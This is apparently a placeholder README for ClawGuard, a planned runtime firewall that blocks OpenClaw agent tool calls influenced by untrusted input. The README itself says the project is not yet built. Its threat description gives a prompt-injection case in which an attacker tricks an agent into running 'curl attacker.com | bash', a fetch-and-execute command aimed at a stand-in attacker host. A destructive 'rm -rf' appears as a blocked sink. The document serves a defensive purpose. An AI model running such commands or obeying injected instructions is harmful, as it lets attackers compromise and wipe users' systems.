# ClawGuard

**Execution Firewall for AI Agents**

Your agents follow orders. Make sure they're yours.

**Powered by MVAR**

---

ClawGuard blocks attacker-influenced actions before your agents can execute them.

No prompt filters.
No LLM judges.
Just policy at the moment execution happens.

---

## What ClawGuard Does

ClawGuard wraps OpenClaw tools with **MVAR (MIRRA Verified Agent Runtime)** — a deterministic execution governance layer that:

- **Tracks provenance**: Was this command influenced by untrusted input?
- **Enforces capability boundaries**: Does this tool have permission to write files?
- **Blocks at sinks**: If `untrusted_input → bash_tool → rm -rf`, ClawGuard blocks the execution.
- **Audits all decisions**: Every allow/block is logged with full causal trace.

ClawGuard is not a model. It's a runtime firewall. It works with any LLM, any OpenClaw agent, any tool definition.

---

## Why ClawGuard Exists

OpenClaw is powerful. Its agents can browse, write code, execute commands, manage files. But OpenClaw doesn't enforce execution boundaries.

If an attacker tricks the agent into running `curl attacker.com | bash`, OpenClaw will execute it.

ClawGuard stops that execution before it happens.

---

## Ecosystem Framing

**OpenClaw** → Agent runtime
**SuperClaw** → Pre-deployment red team
**ClawGuard** → Runtime enforcement

---

## How It Works

```python
from clawguard import protect
from openclaw import BashTool, FileWriteTool

# Wrap your tools
safe_bash = protect(BashTool(), sinks=["shell"])
safe_write = protect(FileWriteTool(), sinks=["filesystem"])

# Use them normally
agent = OpenClawAgent(tools=[safe_bash, safe_write])
agent.run("Deploy the app to production")
```

If the agent tries to execute a command influenced by untrusted input (user message, web scrape, API response), ClawGuard blocks it and logs the decision.

---

## Status

**ClawGuard is not yet implemented.** This repo is a placeholder.

The plan:
1. Build MVAR adapter for OpenClaw tools
2. Define sink policies for common attack vectors
3. Package as `clawguard` pip-installable package
4. Validate against OpenClaw's attack pack (50+ test cases)

See `docs/ROADMAP.md` for full implementation plan.

---

## Related Projects

- **MVAR** ([github.com/mvar-security/mvar](https://github.com/mvar-security/mvar)) — The underlying runtime governance layer
- **OpenClaw** ([github.com/OpenClaw/OpenClaw](https://github.com/OpenClaw/OpenClaw)) — The AI agent framework ClawGuard protects
- **MIRRA EOS** — The cognitive architecture that originated MVAR's design principles

---

## Contact

Questions? Open an issue or reach out to [@mvar-security](https://github.com/mvar-security).

**License:** Apache 2.0 (not yet applied — placeholder repo only)
